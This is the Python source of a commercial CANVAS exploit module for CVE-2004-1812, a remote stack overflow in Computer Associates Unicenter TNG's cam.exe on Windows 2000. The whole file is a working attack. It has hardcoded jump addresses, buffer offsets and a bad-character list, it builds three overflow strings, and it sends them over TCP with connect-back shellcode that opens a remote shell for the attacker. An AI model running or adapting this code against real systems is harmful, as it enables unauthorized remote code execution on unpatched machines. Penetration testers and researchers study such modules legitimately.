#! /usr/bin/env python

#
# CANVAS cam.exe Exploit
# cam.exe is loaded as party of the Unicenter TNG Agent Technology Service
# Which is a Computer Associates product
#

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

import sys
#covers both angles
sys.path.append(".")
sys.path.append("../../")
sys.path.append('../../encoder')
sys.path.append('./encoder')
sys.path.append("../../shellcode")
sys.path.append("./shellcode")
sys.path.append("../../gui")
sys.path.append("./gui")


import os,getopt
import socket
from exploitutils import *
import addencoder
import win32shell
from tcpexploit import tcpexploit
import canvasengine
from canvasengine import socket_save_list
import time
import shellcodeGenerator


NAME="TNG - cam.exe"
DESCRIPTION="cam.exe stack overflow."
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Computer Associates"
DOCUMENTATION["Repeatability"]="This is a one shot exploit."
DOCUMENTATION["VersionsAffected"]="run camstat: Version 1.05 (Jun  8 2000 13:22) (TNSVER.exe reports 2.4)"
DOCUMENTATION["Patch"]="Patched by QO44056.CAZ"
DOCUMENTATION["CVE Name"] = "CVE-2004-1812"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-1812"
DOCUMENTATION['CVSS'] = 10.0

#QO44056 fixes this?
VERSION="1.0"
GTK2_DIALOG="dialog.glade2"

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "2000" ]

NOTES="""

cam.exe - restart TNS Agent Technology to start. Only loads once though, so
get it right the first time.

Call stack:
    0040b140  #Continuation of Execution Problem
    0040ae10  #
    0040a120  #
    cam.__mm_main
    
You can see the bug easily by breakpointing on recv. It's a simple
stack overflow where they calculate the length of the buffer from the length
we send in...

Note: The stack is slightly variable due to hostname changes.
    
"""

CHANGELOG="""

"""


runAnExploit_gtk2=canvasengine.runAnExploit_gtk2
runExploit=canvasengine.runExploit

    

    

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        
        self.port=3104
        self.host=""
        self.shellcode="\xcc" * 298
        #hmm, according to 60074207 we only compare with 0, 0d 0a 3f 26 20
        #self.searchbadstring="%.,:;\x00\x0a\x0d+\"\x2f\x5c\x09\x0e\x0b =&~("
        self.searchbadstring="%\x00\x0a\x0d&? 0"
        self.badstring=self.searchbadstring
        self.ssl=0
        self.setVersions()
        self.version=1
        
        self.name=NAME        
        return


    def displayVersions(self):
        for v in self.versions.keys():
            print "Version %d: %s"%(v,self.versions[v][0])

    def setVersions(self):
        self.versions={}
        #name, jmp esp, writeloc, writable, shelloc
        self.versions[1]=("Windows 2000 SP 3 (MSAFD)",0x74fd2d57,24,0x77520000,220)


    def neededListenerTypes(self):
        return [canvasengine.WIN32MOSDEF]
    
    def createShellcode(self):
        host=self.callback.ip
        port=self.callback.port
        return self.createWin32Shellcode(self.badstring,host,port)
    
    def test(self):
        """
        
        """
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        
        #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s=self.gettcpsock()
        try:
            s.connect((self.host, self.port))
        except:
            self.log("No connection could be established")
            return 0
        return 1
    
    def run(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        
        self.setInfo("%s attacking %s:%d (in progress)"%(NAME,self.host,self.port))

        if self.version==0:
            self.log("Automatic versioning not enabled.")
            self.setInfo("%s attacking %s:%d - done (success!)"%(NAME,self.host,self.port))
            return 0

        self.log("Attacking %s:%d"%(self.host,self.port))
        (sploitstring1,sploitstring2,sploitstring3)=self.makesploit()
        try:
            #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s=self.gettcpsock()
            s.connect((self.host, self.port))
            self.websend(s,sploitstring1)
            self.websend(s,sploitstring2)
            time.sleep(2)
            try:
                self.websend(s,sploitstring3)
            except:
                self.log("Attack was reset: system is patched.")
                self.setInfo("%s attacking %s:%d - done (failed!)"%(NAME,self.host,self.port))
                return 0
            data=""
            data+=s.recv(1000)
            self.log("Attack received: %s"%prettyprint(data))
        except:
            #import traceback
            #traceback.print_exc(file=sys.stdout)
            self.log("Attack reported no open socket - service died?")
            self.setInfo("%s attacking %s:%d - done (failed?)"%(NAME,self.host,self.port))
                    
            return 0
        self.setInfo("%s attacking %s:%d - done (success!)"%(NAME,self.host,self.port))
        return 1
        
    def makesploit(self):
        """
        Construct the attack
        returns a tuple of 3 strings
        """

        geteip=self.versions[self.version][1]
        writeloc=self.versions[self.version][2]
        writable=self.versions[self.version][3]
        writable+=0x02eb # add jmp esp to end
        shelloc=self.versions[self.version][4]
        
        sploitstring1="A"*73 # program calculates size of buffer based on this
        sploitstring2="YoAgain!" #any string will work...
        sploitstring3="B"*4747
        sploitstring3=stroverwrite(sploitstring3,intel_order(writable),writeloc)
        sploitstring3=stroverwrite(sploitstring3,intel_order(geteip),20)
        generator=shellcodeGenerator.X86()
        generator.addAttr("Jump",{"jmpvalue":500,"badstring":self.badstring})
        jmpval=generator.get()
        if jmpval=="":
            self.log("Was not able to generate jumpval!")
            return ("","","")
        
        sploitstring3=stroverwrite(sploitstring3,jmpval,writeloc+4)
        
        sploitstring3=stroverwrite(sploitstring3,self.shellcode,shelloc)
        
        return (sploitstring1,sploitstring2,sploitstring3)



if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    
